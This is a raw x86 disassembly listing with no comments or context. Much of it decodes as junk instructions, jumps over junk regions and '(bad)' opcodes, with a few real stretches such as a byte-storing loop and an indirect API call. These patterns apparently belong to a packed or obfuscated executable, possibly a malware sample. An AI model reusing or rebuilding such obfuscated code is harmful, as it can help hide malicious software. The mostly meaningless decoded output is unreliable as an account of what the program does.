  40417d:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  404184:	add    DWORD PTR ds:0x4337db,ebx
  40418a:	mov    eax,DWORD PTR [ebp-0x8]
  40418d:	sbb    ecx,0x3751
  404193:	mov    ecx,0x7510853
  404198:	jmp    0x40436a
  40419d:	mov    ds,ebp
  40419f:	inc    eax
  4041a0:	add    DWORD PTR [ebx-0x6f],0x1318dd55
  4041a7:	and    edx,esp
  4041a9:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4041ab:	popf   
  4041ac:	xchg   BYTE PTR [eax-0x548383dc],ch
  4041b2:	jg     0x404230
  4041b4:	jl     0x404223
  4041b6:	cld    
  4041b7:	jmp    0x608753c2
  4041bc:	cmp    cl,BYTE PTR ds:0x61bdbe61
  4041c2:	push   edx
  4041c3:	lahf   
  4041c4:	outs   dx,BYTE PTR ds:[esi]
  4041c5:	popf   
  4041c6:	mov    ch,0x4c
  4041c8:	lods   eax,DWORD PTR gs:[esi]
  4041ca:	sahf   
  4041cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041cc:	out    dx,al
  4041cd:	cmc    
  4041ce:	std    
  4041cf:	dec    edx
  4041d0:	(bad)  
  4041d1:	xlat   BYTE PTR ds:[ebx]
  4041d2:	or     al,0xb4
  4041d4:	loop   0x4041d4
  4041d6:	dec    ebp
  4041d7:	aaa    
  4041d8:	sbb    dl,BYTE PTR [eax]
  4041da:	(bad)  
  4041db:	les    esi,FWORD PTR [ebp+0xb]
  4041de:	mov    DWORD PTR ss:[esi],ecx
  4041e1:	nop
  4041e2:	loop   0x4041e1
  4041e4:	mov    bh,0xc9
  4041e6:	loopne 0x404190
  4041e8:	xlat   BYTE PTR ds:[ebx]
  4041e9:	xchg   ecx,eax
  4041ea:	outs   dx,DWORD PTR ds:[esi]
  4041eb:	dec    esp
  4041ec:	arpl   dx,dx
  4041ee:	push   ecx
  4041ef:	jp     0x4041c8
  4041f1:	out    dx,al
  4041f2:	xor    DWORD PTR [ecx+eax*4-0x722013e7],edi
  4041f9:	ins    BYTE PTR es:[edi],dx
  4041fa:	(bad)  
  4041fb:	ficom  WORD PTR [esi+edx*8+0x6b]
  4041ff:	int    0xcb
  404201:	aam    0x95
  404203:	jmp    0x40421b
  404205:	add    al,0x25
  404207:	and    DWORD PTR [eax-0x11f1f4d3],ecx
  40420d:	push   0x58
  40420f:	or     al,0x3d
  404211:	sub    eax,0x4d79265e
  404216:	inc    esp
  404218:	xlat   BYTE PTR ds:[ebx]
  404219:	clc    
  40421a:	fsubr  st(1),st
  40421c:	mov    WORD PTR [esi-0x39267272],gs
  404222:	mov    bh,BYTE PTR [edi+0x290815ed]
  404228:	mov    edx,0xaa371b89
  40422d:	bound  edi,QWORD PTR [ecx+0x5]
  404230:	adc    BYTE PTR ds:0xb4cda95,ah
  404236:	or     ebx,ebx
  404238:	push   es
  404239:	or     eax,eax
  40423b:	dec    edx
  40423c:	mov    eax,DWORD PTR ds:0xabaab5b
  404242:	jge    0x4041d0
  404244:	retf   
  404245:	inc    eax
  404246:	(bad)  
  404248:	scas   al,BYTE PTR es:[edi]
  404249:	retf   
  40424a:	js     0x404247
  40424c:	and    esp,DWORD PTR ds:0x491ea5a6
  404252:	mov    dh,0x4c
  404254:	jmp    0x7ae010b8
  404259:	pop    ebx
  40425a:	pop    esi
  40425b:	test   al,0xd8
  40425e:	push   edi
  40425f:	and    BYTE PTR [esi+0x3e6afba],bh
  404265:	and    BYTE PTR [esi+0x7d1b0b52],0x6b
  40426c:	xor    BYTE PTR [ecx+0x2a],0xf3
  404270:	ins    BYTE PTR es:[edi],dx
  404271:	pop    ss
  404272:	lods   al,BYTE PTR ds:[esi]
  404273:	cwde   
  404274:	stos   BYTE PTR es:[edi],al
  404275:	xchg   ecx,eax
  404276:	out    0x70,eax
  404278:	cmp    al,0xea
  40427a:	adc    al,0xd3
  40427c:	push   ebp
  40427d:	enter  0x4792,0x50
  404281:	in     eax,dx
  404282:	inc    edx
  404283:	dec    ebx
  404284:	icebp  
  404285:	dec    edi
  404286:	fmul   DWORD PTR gs:[ebx+0x8c5aa05]
  40428d:	xchg   edx,eax
  40428e:	jge    0x404254
  404290:	lods   al,BYTE PTR ds:[esi]
  404291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404292:	dec    ecx
  404293:	pusha  
  404294:	mov    esp,ebp
  404296:	pop    esp
  404297:	push   edi
  404298:	push   es
  404299:	bound  edi,QWORD PTR [ebx-0x1e]
  40429c:	sub    dl,bl
  40429e:	loopne 0x40422e
  4042a0:	add    ecx,DWORD PTR [ecx+0x1f]
  4042a3:	pop    es
  4042a4:	test   DWORD PTR [ebx+0x7c2a1661],ecx
  4042aa:	imul   cl
  4042ac:	jno    0x40422f
  4042ae:	(bad)  
  4042af:	lahf   
  4042b0:	test   BYTE PTR [ecx],dl
  4042b2:	ds xchg ebx,eax
  4042b4:	mov    esi,0xd4f2c17
  4042b9:	aam    0xa3
  4042bb:	dec    esi
  4042bc:	add    esi,ebx
  4042be:	imul   ebx,edi,0x7d7f304
  4042c4:	or     eax,0xa1a662fe
  4042c9:	sub    bl,BYTE PTR [eax-0x16]
  4042cc:	mov    WORD PTR [edx+0x5d27291f],es
  4042d2:	push   es
  4042d3:	out    0x5a,al
  4042d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042d6:	repnz popa 
  4042d8:	adc    dl,dl
  4042da:	adc    bl,al
  4042dc:	jb     0x4042ef
  4042de:	out    dx,eax
  4042df:	adc    BYTE PTR [esi],al
  4042e1:	retf   0xf0b8
  4042e4:	test   eax,0xc6a089df
  4042e9:	stc    
  4042ea:	loop   0x4042e5
  4042ec:	ins    DWORD PTR es:[edi],dx
  4042ed:	cmp    eax,0x79594119
  4042f2:	loopne 0x4042e0
  4042f4:	push   edx
  4042f5:	adc    al,0xd6
  4042f7:	cld    
  4042f8:	jmp    0x404314
  4042fa:	out    dx,eax
  4042fb:	int    0xef
  4042fd:	mov    ebp,0xff7a6c3
  404302:	clc    
  404303:	into   
  404304:	stos   DWORD PTR es:[edi],eax
  404305:	pusha  
  404306:	mov    esi,0xa74fd0f5
  40430b:	jge    0x4042e3
  40430d:	retf   0xeed8
  404310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404311:	jecxz  0x404373
  404313:	lea    edx,[edx]
  404315:	push   ds
  404316:	fcmovnbe st,st(0)
  404318:	in     al,0xc4
  40431a:	call   0x48d5:0xe3c030bf
  404321:	sbb    DWORD PTR [edi+0x36],esi
  404324:	adc    DWORD PTR [eax-0x44],0x770db58
  40432b:	fisttp DWORD PTR [edi+0x644ca3d5]
  404331:	scas   eax,DWORD PTR es:[edi]
  404332:	ins    BYTE PTR es:[edi],dx
  404333:	mov    al,0x3e
  404335:	push   ebx
  404336:	hlt    
  404337:	call   0x833e8143
  40433c:	shl    DWORD PTR [eax],cl
  40433e:	cmp    bh,dl
  404340:	(bad)  
  404343:	(bad)  
  404344:	fadd   QWORD PTR [esi+0x7d3c97f9]
  40434a:	daa    
  40434b:	or     bh,dl
  40434d:	xlat   BYTE PTR ds:[ebx]
  40434e:	aas    
  40434f:	stc    
  404350:	mov    esi,0x92a5f8b4
  404355:	shl    BYTE PTR [ebx],1
  404357:	aad    0xac
  404359:	in     al,0xc7
  40435b:	cmp    DWORD PTR [esi+edx*1+0x34],0xffffffb9
  404360:	and    bl,BYTE PTR [esi]
  404362:	xor    DWORD PTR [edi],edi
  404364:	mov    bl,0x62
  404366:	les    ebp,FWORD PTR [esi+0x4]
  404369:	or     eax,0x9f0d8156
  40436e:	aaa    
  40436f:	inc    ebx
  404370:	add    BYTE PTR [ebx+0x46],al
  404373:	add    BYTE PTR [eax],al
  404375:	xor    eax,ecx
  404377:	add    DWORD PTR ds:0x4337af,0x1b4e
  404381:	mov    esi,0x32729a
  404386:	or     DWORD PTR ds:0x4337af,0x43376f
  404390:	jmp    0x404562
  404395:	sub    ecx,DWORD PTR [edx]
  404397:	mov    esi,DWORD PTR [ebx-0x6dcc424b]
  40439d:	mov    cl,0x88
  40439f:	cmp    BYTE PTR [ecx],bh
  4043a1:	stc    
  4043a2:	and    eax,DWORD PTR [ecx+0x70]
  4043a5:	out    0x26,eax
  4043a7:	jl     0x404425
  4043a9:	stos   DWORD PTR es:[edi],eax
  4043aa:	jg     0x404428
  4043ac:	jl     0x4043bc
  4043ae:	leave  
  4043af:	popa   
  4043b0:	in     eax,0xa0
  4043b2:	dec    ecx
  4043b3:	popf   
  4043b4:	and    BYTE PTR [ebx+ebx*8+0x1e],bh
  4043b8:	sub    DWORD PTR [edi-0xd],esp
  4043bb:	idiv   al
  4043bd:	push   0x8
  4043bf:	push   ds
  4043c0:	aaa    
  4043c1:	scas   al,BYTE PTR es:[edi]
  4043c2:	mov    al,ds:0xdf716b9f
  4043c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043c8:	xlat   BYTE PTR ds:[ebx]
  4043c9:	rcl    BYTE PTR [edi+0x2c],0x80
  4043cd:	call   FWORD PTR [ebx+0xcd382f7]
  4043d3:	shl    DWORD PTR [esi-0x7a],1
  4043d6:	pop    ds
  4043d7:	push   0x75
  4043d9:	jnp    0x4043f9
  4043db:	stc    
  4043dc:	jne    0x4043bd
  4043de:	sub    ebp,DWORD PTR [esi+eax*2-0x34]
  4043e2:	loopne 0x4043c3
  4043e4:	jle    0x40445e
  4043e6:	mov    bl,0x84
  4043e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043e9:	push   edi
  4043ea:	mov    esi,0x1a53f78
  4043ef:	(bad)  
  4043f0:	xchg   BYTE PTR [ebp+ebp*1-0x7b49d825],ah
  4043f7:	sub    BYTE PTR [edi+0x10],0x39
  4043fb:	dec    eax
  4043fc:	aas    
  4043fd:	cdq    
  4043fe:	xchg   ecx,eax
  4043ff:	dec    ecx
  404400:	push   esi
  404401:	dec    BYTE PTR [di]
  404404:	div    BYTE PTR [ecx-0x7d]
  404407:	dec    esp
  404408:	or     al,0x80
  40440a:	cmp    eax,0xf8051edc
  40440f:	test   al,0x22
  404411:	call   FWORD PTR [eax-0x68]
  404414:	mov    al,0x52
  404416:	lahf   
  404417:	sub    esi,DWORD PTR [esi+ebp*4-0x19b4f470]
  40441e:	pop    ds
  40441f:	pop    ds
  404420:	ror    BYTE PTR [ebp+0x44464326],0x69
  404427:	loop   0x40441d
  404429:	and    DWORD PTR [ebx+0x160ee99c],esi
  40442f:	push   ebp
  404430:	sbb    dl,BYTE PTR [edx+0x35]
  404433:	call   0x3e20:0x6cb83f02
  40443a:	mov    eax,ds:0xea3641bb
  40443f:	pusha  
  404440:	pop    es
  404441:	cmc    
  404442:	and    ebp,DWORD PTR [eax-0x29]
  404445:	rcl    DWORD PTR [ecx-0x2a570d5e],cl
  40444b:	jp     0x404496
  40444d:	scas   al,BYTE PTR es:[edi]
  40444e:	push   0x8c5a7868
  404453:	(bad)  
  404454:	inc    esi
  404455:	sub    eax,eax
  404457:	fcom   QWORD PTR [edi-0x1b]
  40445a:	repz xor cl,BYTE PTR [ecx-0x30072850]
  404461:	psrlw  mm4,QWORD PTR [ebx+ebx*2]
  404465:	sbb    DWORD PTR [esi],edx
  404467:	ret    
  404468:	ret    0x6bb2
  40446b:	out    0x91,eax
  40446d:	shr    DWORD PTR [esi],1
  40446f:	imul   ebp,DWORD PTR [edi],0xba31a056
  404475:	test   al,0xc0
  404477:	xchg   edi,eax
  404478:	jae    0x404439
  40447a:	in     al,0xb8
  40447c:	mov    al,ds:0x9a75c4be
  404481:	mov    WORD PTR [eax+edx*4],ds
  404484:	mov    dl,0x9a
  404486:	popa   
  404487:	into   
  404488:	dec    ebp
  404489:	mov    ebp,0xa4ec6a5b
  40448e:	push   edx
  40448f:	icebp  
  404490:	mov    ecx,0x99806672
  404495:	ins    BYTE PTR es:[edi],dx
  404496:	or     BYTE PTR [ecx],dl
  404498:	inc    ebx
  404499:	inc    ebx
  40449a:	into   
  40449b:	dec    edi
  40449c:	out    dx,al
  40449d:	inc    esp
  40449e:	lea    esi,[edi+ecx*8-0x19]
  4044a2:	frstor [esi]
  4044a4:	inc    edi
  4044a5:	data16 mov ch,dl
  4044a8:	cmp    al,0x59
  4044aa:	es das 
  4044ac:	stos   BYTE PTR es:[edi],al
  4044ad:	push   esi
  4044ae:	mov    eax,DWORD PTR [edi-0x37]
  4044b1:	xor    BYTE PTR [ebp-0x1f],al
  4044b4:	ss fchs 
  4044b7:	mov    esp,0x33d8798
  4044bc:	mov    ebp,0xe584515d
  4044c1:	icebp  
  4044c2:	xlat   BYTE PTR ds:[ebx]
  4044c3:	or     esi,edx
  4044c5:	add    eax,0xfdb44be6
  4044ca:	arpl   WORD PTR [ecx+0x5e5a98],bp
  4044d0:	mov    al,0x62
  4044d2:	inc    eax
  4044d3:	stc    
  4044d4:	retf   
  4044d5:	js     0x40454d
  4044d7:	xor    DWORD PTR [edi],edx
  4044d9:	mov    WORD PTR [edi-0x39b38ba0],?
  4044df:	pop    ecx
  4044e0:	xor    ebx,ecx
  4044e2:	adc    esp,DWORD PTR [eax+0x168193c6]
  4044e8:	or     eax,0x2de9ef81
  4044ed:	iret   
  4044ee:	xchg   esi,eax
  4044ef:	pop    ecx
  4044f0:	mov    al,0x1e
  4044f2:	aam    0x36
  4044f4:	cmp    al,0x95
  4044f6:	outs   dx,DWORD PTR ds:[esi]
  4044f7:	xchg   esp,eax
  4044f8:	(bad)  
  4044f9:	adc    al,0x14
  4044fb:	push   ds
  4044fc:	je     0x40452b
  4044fe:	xchg   ecx,eax
  4044ff:	addr16 inc ecx
  404501:	mov    ds:0xa81b6c0f,al
  404506:	jb     0x4044ac
  404508:	mov    edi,eax
  40450a:	mov    esi,0x9b653de7
  40450f:	inc    ebp
  404510:	test   ecx,edx
  404512:	push   ebx
  404513:	sub    BYTE PTR [edx-0x1b08da31],0xcc
  40451a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40451b:	push   edi
  40451c:	test   al,bh
  40451e:	add    DWORD PTR [eax],ebx
  404520:	test   ah,dl
  404522:	push   0xffffffd1
  404524:	xchg   ecx,eax
  404525:	sbb    ch,ah
  404527:	daa    
  404528:	jmp    DWORD PTR [eax-0x1e]
  40452b:	stc    
  40452c:	jmp    0x404567
  40452e:	test   eax,0xe011f5f5
  404533:	mov    ah,0xe
  404535:	mov    ecx,0x2bf7e8cb
  40453a:	retf   0xe1ff
  40453d:	bound  ebx,QWORD PTR [edi+0x62]
  404540:	mov    al,ds:0xb06d8ea
  404545:	and    eax,0xddf0dffd
  40454a:	js     0x4045bf
  40454c:	loop   0x4045b5
  40454e:	aas    
  40454f:	pop    ds
  404550:	fs ret 
  404552:	stos   BYTE PTR es:[edi],al
  404553:	lods   eax,DWORD PTR ds:[esi]
  404554:	xchg   esi,eax
  404555:	or     al,0x1e
  404557:	add    dh,al
  404559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40455a:	push   cs
  40455b:	aam    0xb0
  40455d:	lds    ecx,FWORD PTR [eax+edi*1-0x39fc88b1]
  404564:	jmp    0x404757
  404569:	mov    DWORD PTR ds:0x433727,0x6267
  404573:	mov    dl,BYTE PTR [ebp-0x1]
  404576:	mov    DWORD PTR ds:0x4336d3,0x1c06
  404580:	jmp    0x404752
  404585:	rol    DWORD PTR [edx+edi*1],cl
  404588:	push   ss
  404589:	aad    0xd2
  40458b:	ror    ebp,cl
  40458d:	mov    eax,0x11c2aa9d
  404592:	push   ebx
  404593:	imul   esp,DWORD PTR [esi+0x12],0xab7c7c20
  40459a:	jg     0x404618
  40459c:	jl     0x404567
  40459e:	mov    ?,WORD PTR [edi+0x3ba1c74e]
  4045a4:	mov    ds:0x2a55e4dd,al
  4045a9:	adc    al,0x6
  4045ab:	fwait
  4045ac:	dec    esp
  4045ad:	scas   eax,DWORD PTR es:[edi]
  4045ae:	pop    es
  4045af:	mov    al,0xf5
  4045b1:	aam    0xc4
  4045b3:	mov    esi,0xfabdf5fa
  4045b8:	(bad)  
  4045b9:	repz (bad) [esi]
  4045bc:	xor    DWORD PTR [edi-0xeb151da],0x915f81e3
  4045c6:	iret   
  4045c7:	addr16 je 0x4045b4
  4045ca:	imul   esi,DWORD PTR [esi+0x64],0x1791175f
  4045d1:	inc    esp
  4045d2:	sbb    dh,dl
  4045d4:	fs loopne 0x40462d
  4045d7:	mov    WORD PTR [eax-0x5a],ds
  4045da:	inc    esp
  4045db:	sar    DWORD PTR [ecx],cl
  4045dd:	fldenv [ebx+eax*4-0xf]
  4045e1:	jle    0x40460d
  4045e3:	xchg   edi,eax
  4045e4:	add    ah,BYTE PTR [edx-0x1bb0779c]
  4045ea:	test   WORD PTR [edx-0xe],0xb950
  4045f0:	add    DWORD PTR ds:0xa24d595d,ebp
  4045f6:	test   bl,bl
  4045f8:	xchg   edi,eax
  4045f9:	retf   0xf89f
  4045fc:	stos   DWORD PTR es:[edi],eax
  4045fd:	and    ah,BYTE PTR [esi+0x2fd6547d]
  404603:	and    DWORD PTR [edi-0x64423e5d],ebx
  404609:	out    0xec,eax
  40460b:	loop   0x4045cc
  40460d:	mov    esp,DWORD PTR [ebx-0x11b955c2]
  404613:	hlt    
  404614:	xchg   DWORD PTR [esi-0xf],edx
  404617:	pop    eax
  404618:	mov    ch,cl
  40461a:	imul   eax,DWORD PTR [esi-0x80],0x8238b0e3
  404621:	jnp    0x404619
  404623:	sbb    eax,0x767b901f
  404628:	sub    al,dh
  40462a:	outs   dx,DWORD PTR ds:[esi]
  40462b:	mov    bl,BYTE PTR [edx+ebp*4]
  40462e:	mov    esp,0x904a312b
  404633:	mov    WORD PTR [edi+edi*1+0x1a4d30],cs
  40463a:	ds mov edx,0xb592f737
  404640:	xor    esi,esp
  404642:	lahf   
  404643:	push   ss
  404644:	xchg   ebx,eax
  404645:	sub    al,0x97
  404647:	es push eax
  404649:	mov    ebp,0xd5feda95
  40464e:	mov    ds:0xe157d2e7,eax
  404653:	mov    ecx,0x1fedef87
  404658:	daa    
  404659:	mov    dh,al
  40465b:	mov    eax,ds:0x36e3a344
  404660:	mov    ebx,0x6430e772
  404665:	(bad)  
  404666:	jnp    0x4046c3
  404668:	mov    ss,WORD PTR [ecx-0x43]
  40466b:	icebp  
  40466c:	mov    ecx,0x20e0df65
  404671:	mov    eax,ds:0x66701faf
  404676:	add    eax,0x594d6e3e
  40467b:	(bad)  
  40467c:	cli    
  40467d:	xchg   edi,eax
  40467e:	enter  0xb540,0xea
  404682:	mov    DWORD PTR [ebp-0x22b77f43],esi
  404688:	repz into 
  40468a:	fcomp  DWORD PTR [edx]
  40468c:	cmp    edx,ebx
  40468e:	jae    0x40463a
  404690:	sub    eax,0xd1c5d77d
  404695:	and    edx,DWORD PTR [ecx]
  404697:	mov    dl,0x24
  404699:	jmp    0x4046db
  40469b:	mov    BYTE PTR [eax],bl
  40469d:	dec    ecx
  40469e:	fldenv [edi]
  4046a0:	or     eax,0xcfd04ff5
  4046a5:	les    ecx,FWORD PTR [edx-0x5b9e6a72]
  4046ab:	ds pusha 
  4046ad:	xor    BYTE PTR [edx+ecx*1],ch
  4046b0:	lock sub dl,dh
  4046b3:	ret    
  4046b4:	pop    ds
  4046b5:	add    DWORD PTR [edi],ebx
  4046b7:	sub    bh,BYTE PTR [ecx-0x3faf4b5d]
  4046bd:	add    ecx,ebx
  4046bf:	jl     0x4046ab
  4046c1:	call   0x65af519c
  4046c6:	dec    edx
  4046c7:	call   0xe746:0x45ebe904
  4046ce:	pop    ss
  4046cf:	or     ah,dl
  4046d1:	fld    DWORD PTR [eax+0x3b4bb790]
  4046d8:	mov    al,0x5e
  4046da:	icebp  
  4046db:	stos   BYTE PTR es:[edi],al
  4046dc:	inc    eax
  4046dd:	jae    0x40472e
  4046df:	push   ds
  4046e0:	push   ds
  4046e1:	push   ebx
  4046e2:	aam    0x1
  4046e4:	js     0x4046ac
  4046e6:	mov    eax,ds:0x2d8cbc22
  4046eb:	fistp  DWORD PTR [esi-0x73]
  4046ee:	loopne 0x40468c
  4046f0:	jle    0x404690
  4046f2:	sbb    bh,BYTE PTR [edi+0x7e]
  4046f5:	out    0xce,al
  4046f7:	or     edi,DWORD PTR [ecx+0x7e9d397]
  4046fd:	imul   esp,DWORD PTR [ebp+0x41ead8cf],0xffffff9b
  404704:	(bad)  
  404705:	daa    
  404706:	jl     0x4046c4
  404708:	push   edi
  404709:	call   0x33ba468b
  40470e:	mov    ah,dl
  404710:	pop    ss
  404711:	cwde   
  404712:	ss push esp
  404714:	lahf   
  404715:	mov    ebx,0x226ce2db
  40471a:	sub    BYTE PTR [edi],bh
  40471c:	shr    DWORD PTR ds:0xc58c082b,cl
  404722:	fwait
  404723:	mov    BYTE PTR [esi+0x32],ah
  404726:	test   DWORD PTR [edx-0x4d],ebx
  404729:	jmp    0x18fa566b
  40472e:	imul   edi,DWORD PTR [eax-0xc],0x32
  404732:	(bad)  
  404734:	inc    esi
  404735:	iret   
  404736:	pop    eax
  404737:	pop    ds
  404738:	xchg   ebp,eax
  404739:	xchg   BYTE PTR [esi-0x26],bl
  40473c:	jp     0x4046f6
  40473e:	call   FWORD PTR [esi+eax*1]
  404741:	shr    ecx,0x66
  404744:	pop    ecx
  404745:	cmc    
  404746:	adc    BYTE PTR ds:0xe9567e72,0x5e
  40474d:	popa   
  40474e:	mov    cl,0xc8
  404750:	mov    dl,0xc8
  404752:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  404756:	inc    eax
  404757:	mov    DWORD PTR ds:0x4336cf,0xde3
  404761:	cmp    eax,0x40
  404764:	jb     0x404569
  40476a:	sub    eax,DWORD PTR ds:0x4337d7
  404770:	mov    edx,DWORD PTR [ebp-0x8]
  404773:	mov    DWORD PTR ds:0x4336bf,0x14
  40477d:	cmp    DWORD PTR ds:0x4336bf,0x0
  404784:	je     0x4047dd
  40478a:	cmp    DWORD PTR ds:0x4336bf,0xa
  404791:	jne    0x4047ab
  404797:	push   DWORD PTR [ebp-0x24]
  40479a:	push   DWORD PTR [ebp-0xc]
  40479d:	push   0x42f8
  4047a2:	push   DWORD PTR [ebp-0x24]
  4047a5:	call   DWORD PTR ds:0x4120bc
  4047ab:	cmp    DWORD PTR ds:0x4336bf,0xb
  4047b2:	jne    0x4047c3
  4047b8:	mov    eax,ds:0x4336bf
  4047bd:	dec    eax
  4047be:	mov    ds:0x4336bf,eax
  4047c3:	mov    eax,ds:0x4336bf
  4047c8:	dec    eax
  4047c9:	mov    ds:0x4336bf,eax
  4047ce:	jmp    0x40477d
  4047d3:	or     DWORD PTR ds:0x433763,0x7ef0
  4047dd:	mov    eax,DWORD PTR [ebp-0xc]
  4047e0:	xor    edx,ecx
  4047e2:	xor    DWORD PTR ds:0x433757,0x4337ef
  4047ec:	add    edx,esi
  4047ee:	cmp    edx,eax
  4047f0:	mov    DWORD PTR ds:0x43375b,0x5bbb
  4047fa:	je     0x404a4f
  404800:	sbb    DWORD PTR ds:0x433767,edi
  404806:	push   ebx
  404807:	or     DWORD PTR ds:0x433773,ebx
  40480d:	jmp    0x4049df
  404812:	and    eax,0xfd09dbf4
  404817:	sbb    eax,0xea31f0f5
  40481c:	push   edx
  40481d:	loope  0x404831
  40481f:	pop    ecx
  404820:	cmp    al,0xf
  404822:	dec    ecx
  404823:	and    edi,DWORD PTR [esp+edi*2-0x55]
  404827:	jg     0x4048a5
  404829:	jl     0x404834
  40482b:	pop    edi
  40482c:	pop    esi
  40482d:	ins    BYTE PTR es:[edi],dx
  40482e:	sbb    esi,DWORD PTR [edx-0x39493b1b]
  404834:	xchg   ecx,eax
  404835:	retf   0x50d7
  404838:	sub    ah,BYTE PTR [ebx-0x1d]
  40483b:	lods   al,BYTE PTR ds:[esi]
  40483c:	push   ebp
  40483d:	push   cs
  40483e:	add    al,dl
  404840:	or     dl,BYTE PTR [ebx+0x17295507]
  404846:	and    cl,BYTE PTR [esi+0x2c]
  404849:	cld    
  40484a:	lods   eax,DWORD PTR ds:[esi]
  40484b:	xchg   ebx,eax
  40484c:	cld    
  40484d:	xchg   esi,eax
  40484e:	pop    edi
  40484f:	cmc    
  404850:	ins    DWORD PTR es:[edi],dx
  404851:	add    eax,0xe4523c93
  404856:	or     eax,0x44853dcd
  40485b:	out    dx,al
  40485c:	and    bl,BYTE PTR [ecx+0x51]
  40485f:	in     al,dx
  404860:	push   0x2f563f96
  404865:	js     0x4048cf
  404867:	xor    dh,bl
  404869:	aas    
  40486a:	mov    al,ds:0x1413e15
  40486f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404870:	push   0x3c
  404872:	pusha  
  404873:	ds out 0x19,eax
  404876:	xor    bh,BYTE PTR [eax-0x68a3a060]
  40487c:	xor    esi,esp
  40487e:	in     al,0x25
  404880:	into   
  404881:	fidiv  DWORD PTR [edi+0x3d89b605]
  404887:	rcl    cl,1
  404889:	in     eax,0x6f
  40488b:	mov    cl,0x2c
  40488d:	dec    edi
  40488e:	adc    DWORD PTR [ebx-0x5b],ecx
  404891:	xchg   ecx,ebp
  404893:	inc    esp
  404894:	shl    DWORD PTR [eax+0x4],0x96
  404898:	inc    ebx
  404899:	sbb    eax,0xd1ff7ead
  40489e:	mov    cl,0x4d
  4048a0:	pop    es
  4048a1:	js     0x40486d
  4048a3:	cmp    DWORD PTR [ebp-0x5f],esi
  4048a6:	and    BYTE PTR [eax-0x6c9bc0d8],ah
  4048ac:	cmp    al,0x5f
  4048ae:	push   esi
  4048af:	push   edx
  4048b0:	xchg   edx,eax
  4048b1:	bound  eax,QWORD PTR [eax]
  4048b3:	mov    edx,0x155b5b1c
  4048b8:	dec    edi
  4048b9:	aas    
  4048ba:	nop
  4048bb:	adc    ah,0x8e
  4048be:	sbb    cl,BYTE PTR [edi+edi*2-0x2a]
  4048c2:	and    eax,0x2b4b3ed8
  4048c7:	int3   
  4048c8:	icebp  
  4048c9:	call   FWORD PTR [eax-0x53]
  4048cc:	test   DWORD PTR [eax+0x5],ecx
  4048cf:	push   edi
  4048d0:	mov    bl,0xea
  4048d2:	repnz mov dl,0xbb
  4048d5:	jl     0x4048a4
  4048d7:	out    0xfe,eax
  4048d9:	xorps  xmm6,xmm5
  4048dc:	hlt    
  4048dd:	jle    0x40489e
  4048df:	aas    
  4048e0:	fist   DWORD PTR [ecx-0x24]
  4048e3:	mov    ds:0xdcc6016d,al
  4048e8:	xor    dh,BYTE PTR [ecx]
  4048ea:	dec    ebx
  4048eb:	mov    bl,0x64
  4048ed:	fs addr16 jno 0x404873
  4048f1:	les    ebx,FWORD PTR ss:[edx+0xd]
  4048f5:	fwait
  4048f6:	jecxz  0x404900
  4048f8:	mov    bl,0x93
  4048fa:	inc    edi
  4048fb:	inc    edx
  4048fc:	inc    edx
  4048fd:	push   esi
  4048fe:	cmp    ebp,eax
  404900:	xchg   ebp,eax
  404901:	retf   
  404902:	and    DWORD PTR [ecx-0x32c1321b],0xffffff84
  404909:	arpl   bp,di
  40490b:	mov    ebx,0x1315a1d
  404910:	call   0x9b695c62
  404915:	inc    edi
  404916:	aas    
  404917:	xor    DWORD PTR [edx-0x2f],esi
  40491a:	xchg   esi,eax
  40491b:	inc    esi
  40491c:	adc    eax,edx
  40491e:	dec    ebp
  40491f:	or     ah,BYTE PTR ds:0xff75370a
  404925:	pushf  
  404926:	sub    al,0x42
  404928:	and    al,0x14
  40492a:	adc    BYTE PTR [ecx+ebx*4-0x61],ch
  40492e:	inc    esp
  40492f:	adc    al,BYTE PTR [edx+0x2fd0422d]
  404935:	ret    
  404936:	icebp  
  404937:	mov    dh,0x63
  404939:	out    0xe7,al
  40493b:	(bad)  
  40493c:	xor    al,al
  40493e:	inc    esp
  40493f:	jno    0x404940
  404941:	xor    al,0x63
  404943:	popa   
  404944:	aaa    
  404945:	ins    DWORD PTR es:[edi],dx
  404946:	xchg   ebp,eax
  404947:	mov    WORD PTR es:[eax+0x73b73f02],?
  40494e:	sbb    eax,0x44b03eb5
  404953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404954:	push   DWORD PTR [ebp+ebp*8-0x73acc651]
  40495b:	xchg   esi,eax
  40495c:	lahf   
  40495d:	pop    esi
  40495e:	mov    ah,BYTE PTR [esi-0x4801b89c]
  404964:	loopne 0x404977
  404966:	add    al,0xa7
  404968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404969:	jmp    0x4048f7
  40496b:	ficom  DWORD PTR [edi+edx*1+0x22a3c970]
  404972:	sbb    ebp,DWORD PTR [ebp-0x34]
  404975:	fwait
  404976:	lahf   
  404977:	std    
  404978:	inc    edx
  404979:	mov    bl,0x4d
  40497b:	ins    BYTE PTR es:[edi],dx
  40497c:	fsubr  QWORD PTR [edx-0x581e2fe3]
  404982:	aas    
  404983:	jp     0x404980
  404985:	mov    DWORD PTR [edx-0x6f347df6],ebp
  40498b:	pop    ss
  40498c:	pop    ds
  40498d:	es in  al,0x1b
  404990:	lock jp 0x404963
  404993:	stos   DWORD PTR es:[edi],eax
  404994:	imul   ebx,DWORD PTR [ecx+0x23],0xa
  404998:	mov    ds:0x271dd538,eax
  40499d:	cmp    eax,0xa7d6710e
  4049a2:	dec    ebx
  4049a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049a4:	xlat   BYTE PTR ds:[ebx]
  4049a5:	jg     0x404949
  4049a7:	jae    0x40497f
  4049a9:	mov    bl,0x54
  4049ab:	out    dx,al
  4049ac:	aas    
  4049ad:	leave  
  4049ae:	bound  ecx,QWORD PTR [esi+0x2f]
  4049b1:	xor    ebp,DWORD PTR [ecx+0x18]
